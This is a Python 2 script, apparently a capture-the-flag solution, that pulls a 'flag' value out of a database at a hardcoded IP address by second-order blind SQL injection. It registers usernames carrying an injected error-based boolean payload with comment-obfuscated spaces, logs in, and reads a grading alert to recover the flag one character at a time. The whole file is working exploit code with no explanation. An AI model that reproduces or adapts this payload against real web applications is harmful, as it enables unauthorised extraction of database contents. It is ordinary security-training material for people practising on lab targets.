import requests
import string
import json

urlr="http://210.32.4.20/register.php"
urll="http://210.32.4.20/login.php"
urla="http://210.32.4.20/answer.php"

username="RTL{}{}'/**/or/**/if((ascii(substr((select/**/flag/**/from/**/flag/**/limit/**/0,1),{},1))={}),exp(~(select/**/*/**/from(select/**/user())a)),1)#"
password="111"

flag=""
guess = '{}abcdefghijklmnopqrstuvwxyz0123456789'

for i in range(1,40): 
  print "round: "+ str(i)
  for j in guess:
    tmp = j
    j = ord(j)
    print "[+]"+ username.format(i,j,i,j)
    d={'username': username.format(i,j,i,j), 'password': password}
    re = requests.post(urlr,data=d)
    s = requests.session()
    re = s.post(urll,data=d)
    headers={
      "Host": "210.32.4.20",
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0",
      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
      "Accept-Encoding": "gzip, deflate",
      "Referer": "http://210.32.4.20/answer.php",
     "Content-Type": "application/x-www-form-urlencoded",
      "Content-Length": "7",
      "Connection": "close",
      "Upgrade-Insecure-Requests": "1"
    }
    d={'10.c':'on'}
    re = s.post(urla, data=d)
    if "alert('Your grades is 0')" in re.text:
      flag += tmp
      break
  print flag